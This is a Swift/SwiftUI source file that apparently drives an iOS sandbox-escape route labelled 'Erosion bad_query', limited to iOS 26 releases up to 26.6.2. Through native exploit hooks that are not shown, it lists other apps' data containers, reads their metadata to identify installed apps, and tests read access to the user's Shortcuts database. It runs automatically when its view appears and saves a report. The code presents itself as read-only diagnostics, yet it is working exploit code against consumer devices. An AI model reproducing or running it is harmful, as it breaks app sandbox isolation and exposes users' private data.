import Foundation
import SwiftUI

@_silgen_name("vex_bad_query_grant_read")
private func vex_bad_query_grant_read(_ path: UnsafePointer<CChar>) -> Int64

@_silgen_name("vex_bad_query_release")
private func vex_bad_query_release(_ handle: Int64)

@_silgen_name("vex_bad_query_list")
private func vex_bad_query_list(_ path: UnsafePointer<CChar>, _ maxInode: Int64) -> UnsafeMutablePointer<CChar>?

struct VexErosionProbeResult: Identifiable, Equatable {
    let id = UUID()
    let label: String
    let detail: String
    let success: Bool
}

@MainActor
final class VexErosionBadQueryDiagnostics: ObservableObject {
    static let buildMarker = "v0.14.5-erosion-bad-query-readonly-v1"

    @Published private(set) var results: [VexErosionProbeResult] = []
    @Published private(set) var isRunning = false
    @Published private(set) var note = "Not run on this device."

    private static let root = "/var/mobile/Containers/Data/Application"
    private static let maxInode: Int64 = 10_000_000

    var supportedOS: Bool {
        let v = ProcessInfo.processInfo.operatingSystemVersion
        guard v.majorVersion == 26 else { return false }
        if v.minorVersion < 6 { return true }
        return v.minorVersion == 6 && v.patchVersion <= 2
    }

    func run() {
        guard !isRunning else { return }
        guard supportedOS else {
            note = "Erosion route is gated to the supported iOS 26 range."
            results = []
            return
        }

        isRunning = true
        note = "Enumerating app-container children with the Erosion route…"

        Task.detached(priority: .userInitiated) {
            let values = Self.probe()
            await MainActor.run {
                self.results = values
                self.note = values.contains(where: { $0.success })
                    ? "Erosion-compatible bad_query route is responding."
                    : "Traversal completed, but no child metadata grant succeeded."
                Self.persist(values)
                self.isRunning = false
            }
        }
    }

    private nonisolated static func enumerateChildren() -> [String] {
        return root.withCString { ptr in
            guard let raw = vex_bad_query_list(ptr, maxInode) else { return [] }
            defer { free(raw) }
            return String(cString: raw)
                .split(separator: "\n", omittingEmptySubsequences: true)
                .map(String.init)
        }
    }

    private nonisolated static func metadataIdentifier(for container: String) -> (String?, Int64) {
        let candidates = [
            container + "/.com.apple.mobile_container_manager.metadata.plist",
            container + "/com.apple.mobile_container_manager.metadata.plist",
        ]

        for path in candidates {
            let handle = path.withCString { vex_bad_query_grant_read($0) }
            guard handle >= 0 else { continue }
            defer { vex_bad_query_release(handle) }

            guard let data = try? Data(contentsOf: URL(fileURLWithPath: path)),
                  let plist = try? PropertyListSerialization.propertyList(
                    from: data, options: [], format: nil
                  ) as? [String: Any],
                  let identifier = plist["MCMMetadataIdentifier"] as? String
            else { continue }
            return (identifier, handle)
        }
        return (nil, -1)
    }

    private nonisolated static func probe() -> [VexErosionProbeResult] {
        let children = enumerateChildren()
        var output: [VexErosionProbeResult] = [
            .init(
                label: "Container enumeration",
                detail: "children=\(children.count)",
                success: !children.isEmpty
            )
        ]

        var readable = 0
        var sampleIDs: [String] = []
        for child in children.prefix(128) {
            let (identifier, _) = metadataIdentifier(for: child)
            if let identifier {
                readable += 1
                if sampleIDs.count < 8 { sampleIDs.append(identifier) }
            }
        }

        output.append(
            .init(
                label: "Metadata grants",
                detail: "readable=\(readable) checked=\(min(children.count, 128))",
                success: readable > 0
            )
        )

        if !sampleIDs.isEmpty {
            output.append(
                .init(
                    label: "Resolved containers",
                    detail: sampleIDs.joined(separator: ", "),
                    success: true
                )
            )
        }

        let shortcuts = "/private/var/mobile/Library/Shortcuts/Shortcuts.sqlite"
        let shortcutsHandle = shortcuts.withCString { vex_bad_query_grant_read($0) }
        var shortcutsReadable = false
        if shortcutsHandle >= 0 {
            shortcutsReadable = FileManager.default.isReadableFile(atPath: shortcuts)
            vex_bad_query_release(shortcutsHandle)
        }
        output.append(
            .init(
                label: "Shortcuts database",
                detail: "grant=\(shortcutsHandle) readable=\(shortcutsReadable)",
                success: shortcutsReadable
            )
        )

        for row in output {
            print("VEX_EROSION_BAD_QUERY|\(row.label)|success=\(row.success)|\(row.detail)")
        }
        print("VEX_EROSION_BAD_QUERY|COMPLETE|count=\(output.count)")
        return output
    }

    private nonisolated static func persist(_ values: [VexErosionProbeResult]) {
        let lines = values.map {
            "VEX_EROSION_BAD_QUERY|\($0.label)|success=\($0.success)|\($0.detail)"
        } + ["VEX_EROSION_BAD_QUERY|COMPLETE|count=\(values.count)"]
        guard let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first else { return }
        try? lines.joined(separator: "\n").write(
            to: docs.appendingPathComponent("vex_erosion_bad_query_report.txt"),
            atomically: true,
            encoding: .utf8
        )
    }
}

struct VexErosionBadQueryProbeView: View {
    @StateObject private var diagnostics = VexErosionBadQueryDiagnostics()

    var body: some View {
        VStack(alignment: .leading, spacing: 10) {
            HStack {
                VStack(alignment: .leading, spacing: 3) {
                    Text("Erosion bad_query")
                        .font(.headline)
                    Text("Read-only container traversal")
                        .font(.caption)
                        .foregroundStyle(.secondary)
                }
                Spacer()
                Button("Run") { diagnostics.run() }
                    .buttonStyle(.borderedProminent)
                    .disabled(diagnostics.isRunning || !diagnostics.supportedOS)
            }

            Text(diagnostics.note)
                .font(.caption)
                .foregroundStyle(.secondary)

            ForEach(diagnostics.results) { row in
                HStack(alignment: .top) {
                    Text(row.label).font(.subheadline.bold())
                    Spacer()
                    Text(row.detail)
                        .font(.caption.monospaced())
                        .foregroundStyle(row.success ? .green : .secondary)
                        .multilineTextAlignment(.trailing)
                }
            }
        }
        .padding(16)
        .background(.white.opacity(0.055))
        .clipShape(RoundedRectangle(cornerRadius: 18))
        .task {
            if diagnostics.results.isEmpty && !diagnostics.isRunning {
                diagnostics.run()
            }
        }
    }
}
